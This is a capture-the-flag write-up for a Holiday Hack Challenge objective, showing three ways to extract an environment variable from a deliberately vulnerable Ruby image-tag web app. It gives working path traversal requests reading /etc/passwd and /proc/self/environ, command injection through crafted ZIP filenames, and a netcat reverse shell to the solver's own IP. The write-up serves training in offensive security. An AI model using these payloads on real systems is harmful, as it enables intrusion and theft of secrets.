# Objective 8: Broken Tag Generator
Location: Wrapping Room

The objective is to obtain the value of the environment variable `GREETZ` of the [Tag Generator](https://tag-generator.kringlecastle.com/).

## Approach 1: Solution using Path Traversal

It was found that the image download function allows path traversal:
```
curl https://tag-generator.kringlecastle.com/image?id=../../etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
[...]
```
Using this, the value of the environment variable can be obtained like this:
```
curl https://tag-generator.kringlecastle.com/image?id=../../proc/self/environ --output -
PATH=/usr/local/bundle/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binHOSTNAME=cbf2810b7573RUBY_MAJOR=2.7RUBY_VERSION=2.7.0RUBY_DOWNLOAD_SHA256=27d350a52a02b53034ca0794efe518667d558f152656c2baaf08f3d0c8b02343GEM_HOME=/usr/local/bundleBUNDLE_SILENCE_ROOT_WARNING=1BUNDLE_APP_CONFIG=/usr/local/bundleAPP_HOME=/appPORT=4141HOST=0.0.0.0GREETZ=JackFrostWasHereHOME=/home/app
```
So the `GREETZ` variable contains **JackFrostWasHere**

## Approach 2: Solution using RCE

The [Ruby application code](https://github.com/joergschwarzwaelder/hhc2020/blob/master/Objective-8/app.rb) can be downloaded through the above path traversal (the full path of `app.rb` is displayed in the application's error messages):
```
curl https://tag-generator.kringlecastle.com/image?id=../../app/lib/app.rb --output app.rb
```
The application code allows to place uploaded files in a chosen place on the remote system using the ZIP upload function.
Furthermore the application starts the `convert` tool from  ImageMagick which makes it possible to inject shell commands:
```
jsw@io:*$ touch \'\;env\>joergen\;\'.jpg
jsw@io:*$ zip joergen.zip \'\;env\>joergen\;\'.jpg 
  adding: ';env>joergen;'.jpg (stored 0%)
jsw@io:*$ curl https://tag-generator.kringlecastle.com/upload -F'my_file[]=@joergen.zip'
["7ebc17be-a3ea-48f5-95ea-730e1b006520.jpg"]
jsw@io:*$ curl https://tag-generator.kringlecastle.com/image?id=../tmp/joergen
RUBY_MAJOR=2.7
GREETZ=JackFrostWasHere
[..]
```

## Approach 3: Full Interactive Remote Shell
**Option 1:**
Create a ZIP file including an empty jpg file:
```
touch joergen.jpg
zip joergen.zip joergen.jpg
```
Modify the contained filename to one with the shell command for the reverse shell (filename needs to end with an image extension as the application checks for that):
```
printf "@ joergen.jpg\n@=';nc <your IP address> 4444 -e \`which bash\`;'.jpg\n" | zipnote -w joergen.zip
```

**Option 2:**
Create the tailored filename directly:
```
touch \'\;nc\ <your IP address>\ 4444\ -e\ \`which\ bash\`\;\'.jpg
zip joergen.zip \'\;nc\ <your IP address>\ 4444\ -e\ \`which\ bash\`\;\'.jpg
```

**Common part:**
Start the reverse shell listener on your local device:
```
nc -lnvp 4444
```
Get it started:
```
curl https://tag-generator.kringlecastle.com/upload -F'my_file[]=@joergen.zip'
```
Now you have in the reverse shell listener an interactive shell as user `app`.
The user `app` has write access to `/tmp` and `/home/app`.
In addition the user has write access to `/usr/local/bundle`, where the web server is located.
<!--stackedit_data:
eyJoaXN0b3J5IjpbMTUzMjM4MTY1OSwxNTI5MTU4MzM3LC02MD
M1NDkxNTQsLTE5MjY4MTc5MjQsMjEyNTU5OTAzNiwxNDQwMDk3
MDgzLC05MzU4MTMyODgsLTYxMzQ0OTY1NiwtMTA1MjE2MzYxNy
wtMTc2MzU0MTM1NSwxNjA3MzQ4NTE0LC04MjMwNTA4NjEsMTI5
MzcyMDQzOSwxMzk1Nzk0ODI0LC0xNTk5MjU0NDE1LC02MTkyOT
c0MTEsLTU3NjYxMDA3NSwyMTA3NTI5ODQ2LDkyMjE0NDM1LC0z
OTg0OTE0NjFdfQ==
-->